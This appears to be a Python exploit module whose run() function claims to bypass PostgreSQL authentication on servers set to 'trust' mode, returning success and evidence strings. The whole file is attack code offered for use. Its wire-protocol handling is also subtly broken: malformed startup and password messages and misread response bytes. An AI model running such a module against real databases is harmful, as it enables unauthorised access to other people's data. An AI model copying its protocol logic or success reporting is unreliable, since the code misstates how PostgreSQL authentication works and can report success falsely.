def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits PostgreSQL default authentication bypass via trust authentication.
    This works on PostgreSQL servers configured with 'trust' authentication method
    in pg_hba.conf, which allows connections without password verification.
    The vulnerability applies when PostgreSQL is running on standard port 5432
    with trust authentication enabled for local or remote connections.
    """
    try:
        import socket
        import ssl
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # PostgreSQL protocol: send startup message
        # Message length: 4 bytes (length) + 4 bytes (protocol version)
        # Protocol version 3.0 = 0x00030000
        msg = b'\x00\x00\x00\x08\x00\x03\x00\x00'
        sock.send(msg)
        
        # Read response - should get authentication request
        response = sock.recv(1024)
        
        # Check if authentication method is trust (0)
        if len(response) >= 8:
            auth_method = response[4]  # Authentication method byte
            if auth_method == 0:  # Trust authentication
                # Send empty password for trust auth
                password_msg = b'\x00\x00\x00\x05\x00'
                sock.send(password_msg)
                
                # Read response - should get authentication success
                response = sock.recv(1024)
                
                if len(response) >= 4:
                    auth_success = response[0]  # Authentication success = 0
                    if auth_success == 0:
                        # Send startup message with database name
                        db_msg = b'\x00\x00\x00\x09\x00\x03\x00\x00\x00'
                        sock.send(db_msg)
                        
                        # Read response
                        response = sock.recv(1024)
                        
                        if len(response) >= 4:
                            # Check for ReadyForQuery (R)
                            if response[0] == ord('R'):
                                return {
                                    "success": True,
                                    "data": "Trusted authentication bypass successful - no password required",
                                    "evidence": f"PostgreSQL on {host}:{port} accepts connections with trust authentication (auth method 0)"
                                }
        
        sock.close()
        return {"success": False, "data": "", "evidence": ""}
        
    except Exception:
        return {"success": False, "data": "", "evidence": ""}